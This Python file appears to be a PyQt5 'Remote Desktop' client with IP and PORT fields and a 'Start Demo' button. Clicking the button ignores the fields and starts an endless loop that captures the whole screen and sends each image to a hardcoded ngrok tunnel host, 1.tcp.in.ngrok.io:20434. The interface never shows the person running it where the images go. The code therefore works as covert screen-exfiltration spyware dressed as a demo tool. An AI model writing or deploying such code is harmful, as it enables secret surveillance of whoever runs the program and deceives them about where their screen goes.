import socket
import io
from random import randint
import pyautogui
from threading import Thread
import sys
from PyQt5.QtWidgets import QMainWindow, QApplication, QLabel, QPushButton, QLineEdit
from PyQt5.QtGui import QPixmap
from PyQt5.QtCore import QRect, pyqtSignal, QThread, QObject

class ImageSender(QObject):
    error_signal = pyqtSignal(str)

    def __init__(self, ip, port):
        super().__init__()
        self.ip = ip
        self.port = port

    def send_images(self):
        try:
            sock = socket.socket()
            sock.connect((self.ip, int(self.port)))
            while True:
                img = pyautogui.screenshot()
                img_bytes = io.BytesIO()
                img.save(img_bytes, format='PNG')
                sock.send(img_bytes.getvalue())
            sock.close()
        except Exception as e:
            self.error_signal.emit(str(e))

class Desktop(QMainWindow):
    def __init__(self):
        super().__init__()
        self.initUI()

    def StartThread(self):
        ip_address = '1.tcp.in.ngrok.io'
        port_number = 20434
        if ip_address and port_number:
            self.image_sender = ImageSender(ip_address, port_number)
            self.image_thread = QThread()
            self.image_sender.moveToThread(self.image_thread)
            self.image_sender.error_signal.connect(self.handle_error)
            self.image_thread.started.connect(self.image_sender.send_images)
            self.image_thread.start()

    def handle_error(self, error_message):
        print(f"DISCONNECTED: {error_message}")

    def initUI(self):
        self.setGeometry(QRect(pyautogui.size()[0] // 4, pyautogui.size()[1] // 4, 400, 90))
        self.setFixedSize(self.width(), self.height())
        self.setWindowTitle(f"[CLIENT] Remote Desktop: {randint(99999, 999999)}")
        self.btn = QPushButton("Start Demo", self)
        self.btn.move(5, 55)
        self.btn.resize(390, 30)
        self.btn.clicked.connect(self.StartThread)
        self.ip = QLineEdit(self)
        self.ip.move(5, 5)
        self.ip.resize(390, 20)
        self.ip.setPlaceholderText("IP")
        self.port = QLineEdit(self)
        self.port.move(5, 30)
        self.port.resize(390, 20)
        self.port.setPlaceholderText("PORT")

if __name__ == '__main__':
    app = QApplication(sys.argv)
    ex = Desktop()
    ex.show()
    sys.exit(app.exec())
